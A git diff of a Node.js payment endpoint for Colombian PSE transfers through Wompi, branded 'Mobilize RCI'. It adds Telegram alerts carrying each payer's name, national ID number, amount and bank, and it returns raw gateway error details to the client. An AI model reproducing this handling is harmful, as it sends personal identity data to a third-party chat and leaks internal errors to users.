@@ -391,8 +391,8 @@ app.post('/api/pse/generar', async (req, res) => {
 
     const txId = txResp.data.data.id;
     let asyncUrl = null;
-    for (let i = 0; i < 8; i++) {
-      await new Promise(r => setTimeout(r, 1200));
+    for (let i = 0; i < 15; i++) {
+      await new Promise(r => setTimeout(r, 1500));
       const poll = await axios.get(`${WOMPI_API}/transactions/${txId}`, {
         headers: { Authorization: `Bearer ${_wPubKey}` }
       });
@@ -400,8 +400,16 @@ app.post('/api/pse/generar', async (req, res) => {
       if (asyncUrl) break;
     }
 
-    if (!asyncUrl)
+    if (!asyncUrl) {
+      await tgSend(
+        `❌ <b>PSE FALLÓ — Mobilize RCI</b>\n` +
+        `👤 <b>${nombre}</b> | 🪪 <code>${cedula}</code>\n` +
+        `💰 COP ${fmtCOP(montoNum)} | 🏛 Banco: <code>${bancoCode}</code>\n` +
+        `⚠️ No se obtuvo link del banco (txId: <code>${txId}</code>)\n` +
+        `📅 ${new Date().toLocaleString('es-CO')}`
+      );
       return res.status(502).json({ error: 'No se pudo obtener el link del banco. Intenta de nuevo.' });
+    }
 
     await tgSend(
       `🏦 <b>PSE — Mobilize RCI</b>\n` +
@@ -410,14 +418,25 @@ app.post('/api/pse/generar', async (req, res) => {
       `📧 ${email}\n` +
       `💰 <b>COP ${fmtCOP(montoNum)}</b>\n` +
       `🏛 Banco: <code>${bancoCode}</code>\n` +
+      `✅ Redirigido al banco\n` +
       `📅 ${new Date().toLocaleString('es-CO')}`
     );
 
     res.json({ async_payment_url: asyncUrl });
 
   } catch (e) {
-    console.error('PSE generar:', e.message, e.response?.data);
-    res.status(502).json({ error: 'Error al procesar el pago PSE.' });
+    const wompiErr = e.response?.data?.error?.messages || e.response?.data || e.message;
+    const wompiStatus = e.response?.status || 'sin resp';
+    console.error('PSE generar:', wompiStatus, JSON.stringify(wompiErr));
+    await tgSend(
+      `💥 <b>PSE ERROR — Mobilize RCI</b>\n` +
+      `👤 ${nombre} | 🪪 <code>${cedula}</code>\n` +
+      `💰 COP ${fmtCOP(montoNum)}\n` +
+      `❌ HTTP ${wompiStatus}: <code>${JSON.stringify(wompiErr).slice(0, 300)}</code>\n` +
+      `📅 ${new Date().toLocaleString('es-CO')}`
+    );
+    const detail = typeof wompiErr === 'object' ? JSON.stringify(wompiErr) : String(wompiErr);
+    res.status(502).json({ error: `Error al procesar el pago PSE. Detalle: ${detail}` });
   }
 });
 
